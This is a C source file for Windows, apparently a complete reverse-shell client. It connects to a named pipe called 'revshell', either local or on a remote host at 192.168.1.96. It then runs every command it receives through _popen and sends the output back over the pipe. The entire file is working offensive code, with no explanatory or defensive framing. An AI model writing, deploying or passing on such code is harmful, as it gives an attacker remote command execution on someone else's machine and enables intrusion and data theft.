#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <io.h>
#include <process.h>

#define LOCALHOST

#ifdef LOCALHOST
#define SERVER "\\\\.\\pipe\\revshell"
#else
#define SERVER "\\\\192.168.1.96\\pipe\\revshell"
#endif

int main(int agrc, char* argv[]) {


	// We are the client, so we need to connect to the named pipe.

	HANDLE hPipe;

	while (1) {
		hPipe = CreateFile(
			TEXT(SERVER),
			GENERIC_READ |
			GENERIC_WRITE,
			0,
			NULL,
			OPEN_EXISTING,
			0,
			NULL
		);

		if (hPipe != INVALID_HANDLE_VALUE) {
			break;
		}
	}

	BOOL fSucc = FALSE;

	DWORD dwMode;
	dwMode = PIPE_READMODE_MESSAGE;


	fSucc = SetNamedPipeHandleState(
		hPipe,
		&dwMode,
		NULL,
		NULL
	);

	if (!fSucc) {
		printf("Failed to change pipe handle properties");
		return -1;
	}

	char cMessage[4096];
	char buf[4096];

	char lineBuf[128];

	memset(cMessage, 0, sizeof cMessage);
	memset(buf, 0, sizeof buf);

	DWORD numBytes;
	int outBytesWritten;

	FILE* pPipe;

	while (1) {
		memset(cMessage, 0, sizeof cMessage);
		memset(buf, 0, sizeof buf);

		ReadFile(
			hPipe,
			buf,
			sizeof buf,
			&numBytes,
			NULL
		);

		if ((pPipe = _popen(buf, "rt")) == NULL) {
			printf("Failed to use popen");
			return -1;
		}


		memset(lineBuf, 0, sizeof lineBuf);
		outBytesWritten = 0;

		while (fgets(lineBuf, sizeof lineBuf, pPipe)) {
			if (outBytesWritten + sizeof lineBuf >= 4096) {
				break;
			}

			strcat_s(cMessage, sizeof cMessage, lineBuf);

			outBytesWritten = outBytesWritten + sizeof lineBuf;

			memset(lineBuf, 0, sizeof lineBuf);
		}

		WriteFile(
			hPipe,
			cMessage,
			strlen(cMessage),
			&numBytes,
			NULL
		);


		FlushFileBuffers(hPipe);
	}

	return 0;
}